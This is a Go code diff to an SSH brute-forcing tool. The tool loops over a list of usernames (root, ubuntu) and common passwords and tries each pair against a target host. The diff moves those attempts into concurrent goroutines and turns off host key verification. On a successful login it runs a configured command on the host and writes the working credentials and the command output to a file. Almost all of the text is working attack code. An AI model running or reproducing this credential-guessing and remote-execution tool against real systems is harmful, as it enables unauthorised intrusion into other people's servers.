@@ -7,7 +7,7 @@ import (
 )
 import "bruteforcer/Global"
 
-var sshBruteUsers = []string{"root", "admin", "roots"}
+var sshBruteUsers = []string{"root", "ubuntu", "roots"}
 var sshBrutePwds = []string{"123456",
 	"123456789",
 	"12345678",
@@ -77,47 +77,61 @@ var sshBrutePwds = []string{"123456",
 	"lsofadmin37695382"}
 
 func SSHBrute(host string, port string, file *os.File) {
+	isSuc := false
 	if Global.DBG {
 		fmt.Printf("%v开始执行\n", host+":"+port)
 	}
 	for _, user := range sshBruteUsers {
 		for _, pwd := range sshBrutePwds {
-			sshConf := &ssh.ClientConfig{
-				User: user,
-				Auth: []ssh.AuthMethod{
-					ssh.Password(pwd),
-				},
-			}
-			sshdial, err := ssh.Dial("tcp", host+":"+port, sshConf)
-			if err == nil { //如果密码正确
-				defer func(sshdial *ssh.Client) { // 关闭ssh通道
-					err := sshdial.Close()
-					if err != nil {
+			if !isSuc {
+				go func() {
+					sshConf := &ssh.ClientConfig{
+						User: user,
+						Auth: []ssh.AuthMethod{
+							ssh.Password(pwd),
+						},
+						HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 					}
-				}(sshdial)
-				//密码正确
-				session, sessionerr := sshdial.NewSession()
-				if sessionerr == nil {
-					defer func(session *ssh.Session) { // 关闭session
-						err := session.Close()
-						if err != nil {
+					sshdial, err := ssh.Dial("tcp", host+":"+port, sshConf)
+					if err == nil { //如果密码正确
+
+						defer func(sshdial *ssh.Client) { // 关闭ssh通道
+							err := sshdial.Close()
+							if err != nil {
+							}
+						}(sshdial)
+						//密码正确
+						session, sessionerr := sshdial.NewSession()
+						if sessionerr == nil {
+							defer func(session *ssh.Session) { // 关闭session
+								err := session.Close()
+								if err != nil {
+								}
+							}(session)
+
+							shellOutput, runerr := session.CombinedOutput(Global.CMD)
+							if runerr == nil {
+								if isSuc {
+									return
+								}
+
+								sucOutStr := fmt.Sprintf("%v:%v-%v:%v=%v->%v", host, port, user, pwd, Global.CMD, string(shellOutput))
+								println(sucOutStr)                        // 输出成功信息
+								_, _ = file.WriteString(sucOutStr + "\n") // 打印信息
+								isSuc = true
+							}
 						}
-					}(session)
 
-					shellOutput, runerr := session.CombinedOutput(Global.CMD)
-					if runerr == nil {
-						sucOutStr := fmt.Sprintf("%v:%v-%v:%v=%v->%v", host, port, user, pwd, Global.CMD, shellOutput)
-						println(sucOutStr)                        // 输出成功信息
-						_, _ = file.WriteString(sucOutStr + "\n") // 打印信息
+					} else {
+						if Global.DBG {
+							OutStr := fmt.Sprintf("%v:%v-%v:%v", host, port, user, pwd)
+							println("err" + OutStr)
+							println(err.Error())
+						}
 					}
-				}
-
-			} else {
-				if Global.DBG {
-					OutStr := fmt.Sprintf("%v:%v-%v:%v", host, port, user, pwd)
-					println("err" + OutStr)
-				}
+				}()
 			}
+
 		}
 	}
 }
